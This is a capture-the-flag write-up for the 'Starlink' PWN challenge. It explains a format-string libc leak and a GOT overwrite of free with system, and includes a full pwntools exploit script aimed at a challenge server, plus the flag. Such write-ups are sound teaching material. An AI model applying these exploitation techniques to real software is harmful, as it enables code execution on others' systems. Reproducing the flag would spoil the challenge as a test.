# Starlink

**Category:** PWN
**Flag:** `UVT{wh444t_h0us3_0f_sp1r1t_1n_th3_b1g_2026_ph4nt4sm4l_ph4nt4smagor14_1s_1t_y0u_06112009_JSdlsadasd8348Gh}`

## Description

> Humanity engineered this system piece by piece — a satellite cleanup system to prevent Kessler Syndrome.

## TL;DR

Format string leak to get libc base, then use the Description edit's arbitrary relative write to forge a fake linked list node in the GOT area, update the fake node to overwrite `free@GOT` with `system`, then delete a node named "/bin/sh" to get a shell.

## Analysis

The binary is a linked list node manager (no PIE, Partial RELRO) with operations: Create, Update, Delete, Description. Each node is 0x128 bytes: name (25 bytes at +0x00), content (256 bytes at +0x19), next pointer (8 bytes at +0x120).

### Vulnerabilities

1. **Format string** in `main()`: The user-provided name (7 bytes at 0x4040a0) is passed directly to `printf(name)`. Using `%9$p` leaks a `__libc_start_main` return address from the stack, giving us the libc base.

2. **Description edit arbitrary relative write**: The Description submenu option 2 reads a signed 32-bit integer offset via `scanf("%d")`, then calls `read(0, desc_heap_ptr + offset, 0x18)`. By using a negative offset (-320), we can write 24 bytes to any heap location relative to the description buffer — specifically to node A's `next` pointer.

### Exploitation Strategy

1. Leak libc via format string (`%9$p` at stack offset 9).
2. Create node A (name="/bin/sh") and node B (placeholder). Linked list: head → A → B.
3. Enter Description, allocate a description buffer, then use the edit with offset -320 to overwrite A's `next` pointer.
4. Point A->next to a **fake node at 0x403FE7**. At this address:
   - `name[0]` = 0x00 (from `__gmon_start__@GOT` which is zero)
   - `content` area at +0x19 = 0x404000 = `free@GOT`
5. Use Update with an empty name (matches the fake node's `\x00` first byte via `strcmp`). The Update function does `strcpy(node+0x19, user_content)` — this writes to 0x404000, overwriting `free@GOT` with `system`.
6. Delete node A ("/bin/sh"). The program calls `free(node_A)`, which is now `system(node_A)`. Since node_A starts with "/bin/sh\0", this executes `system("/bin/sh")`.

### Key Detail: flush_stdin

The Description menu calls a `flush_stdin()` function (reads until newline) **before** each `scanf("%d")` call for the menu choice. This means an extra `\n` must be sent before each menu selection to satisfy flush_stdin, or the actual choice gets consumed and discarded.

## Solution

### Prerequisites

```bash
pip install pwntools --break-system-packages
```

### Solve Script

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

context.binary = './files/starlink'
e = ELF('./files/starlink')
libc = ELF('./files/libc.so.6')

REMOTE_HOST = sys.argv[1] if len(sys.argv) >= 3 else '194.102.62.175'
REMOTE_PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 24765
LIBC_START_MAIN_RET = 0x2a1ca
FAKE_NODE = 0x403FE7

def exploit(p):
    p.recvuntil(b'store'); p.send(b'd\n')
    p.recvuntil(b'number'); p.sendline(b'1')
    p.recvuntil(b'secret'); p.send(b's\n')
    p.recvuntil(b'name'); p.send(b'%9$p\n')
    time.sleep(0.3)
    data = p.recvuntil(b'> ')
    libc_leak = int(data.split(b'welcome ')[1].split(b'\n')[0], 16)
    libc_base = libc_leak - LIBC_START_MAIN_RET
    system = libc_base + libc.sym['system']

    p.sendline(b'1'); p.recvuntil(b'24):')
    p.send(b'/bin/sh\n')
    p.recvuntil(b'256):'); p.send(b'A'*0x40+b'\n'); p.recvuntil(b'> ')

    p.sendline(b'1'); p.recvuntil(b'24):')
    p.send(b'BBB\n'); p.recvuntil(b'256):')
    p.send(b'B'*0x40+b'\n'); p.recvuntil(b'> ')

    p.sendline(b'4'); p.recvuntil(b'description \n')

    p.send(b'\n'); time.sleep(0.1)
    p.sendline(b'1'); time.sleep(0.1)
    p.send(b'D'*23+b'\n')
    time.sleep(0.2); p.recvrepeat(0.3)

    p.send(b'\n'); time.sleep(0.1)
    p.sendline(b'2')
    p.recvuntil(b'correct?')
    p.sendline(b'-320')
    p.recvuntil(b'correction')
    p.send(p64(FAKE_NODE) + b'\x00'*15 + b'\n')
    time.sleep(0.2); p.recvrepeat(0.3)

    p.send(b'\n'); time.sleep(0.1)
    p.sendline(b'3')
    time.sleep(0.2); p.recvrepeat(0.3)

    p.sendline(b'2')
    p.recvuntil(b'update')
    p.send(b'\n')
    p.recvuntil(b'content')
    p.send(p64(system) + b'\n')
    time.sleep(0.3); p.recvrepeat(0.3)

    p.sendline(b'3')
    p.recvuntil(b'delete')
    p.send(b'/bin/sh\n')
    time.sleep(0.5)
    p.interactive()

is_local = len(sys.argv) >= 2 and sys.argv[1] == 'local'
if is_local:
    p = process(['./files/ld-linux-x86-64.so.2', './files/starlink'])
else:
    p = remote(REMOTE_HOST, REMOTE_PORT)
exploit(p)
```

## Flag

```
UVT{wh444t_h0us3_0f_sp1r1t_1n_th3_b1g_2026_ph4nt4sm4l_ph4nt4smagor14_1s_1t_y0u_06112009_JSdlsadasd8348Gh}
```
